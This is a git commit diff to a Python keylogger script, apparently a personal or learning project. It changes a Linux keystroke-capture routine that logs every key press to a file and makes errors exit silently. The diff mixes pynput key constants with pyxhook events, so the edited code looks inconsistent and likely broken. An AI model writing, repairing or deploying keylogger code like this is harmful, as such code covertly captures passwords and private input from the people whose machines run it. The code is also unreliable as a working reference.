7b44c625f5f12c21246dd4eb5edbd7fedf2a0d3d
Khari <khariw921@gmail.com>
2024-11-10 20:55:54 -0500

    Made some changes to linux keylogger function.

--- keylogger/keylogger.py
+++ keylogger/keylogger.py
@@ -1,6 +1,7 @@
 #!/usr/bin/python
 
 import os
+from pynput import keyboard
 from datetime import datetime
 import pyxhook
 import platform
@@ -16,8 +17,12 @@ def linuxKeylogger():
         with open(log, "a") as f:
             # If 'Enter' key is pressed, replace with newline
             # Use match case for special characters, maybe
-            match event.Key:
-                case "P_Enter": f.write('\n')
+            match event:
+                #case keyboard.Key.enter: f.write('\n')
+                # Backspaces aren't processed correctly
+                case keyboard.Key.backspace: f.write('[backspace]')
+                case keyboard.Key.ctrl_l | keyboard.Key.ctrl_r: pass
+                case keyboard.Key.shift_l | keyboard.Key.shift_r: pass
                 case _: f.write(f"{chr(event.Ascii)}") # Append key presses to file and convert ascii to readable characters
 
     # Create hookmanager
@@ -36,10 +41,11 @@ def linuxKeylogger():
         hook.cancel()
         pass
     except Exception as ex:
-        msg = f"Error while catching events:\n {ex}"
-        pyxhook.print_err(msg)
-        with open(log, "a") as f:
-            f.write(f"\n{msg}")
+        exit()
+        #msg = f"Error while catching events:\n {ex}"
+        #pyxhook.print_err(msg)
+        #with open(log, "a") as f:
+        #    f.write(f"\n{msg}")
 
 # Function for Windows-based OS keylogger
 def winKeylogger():
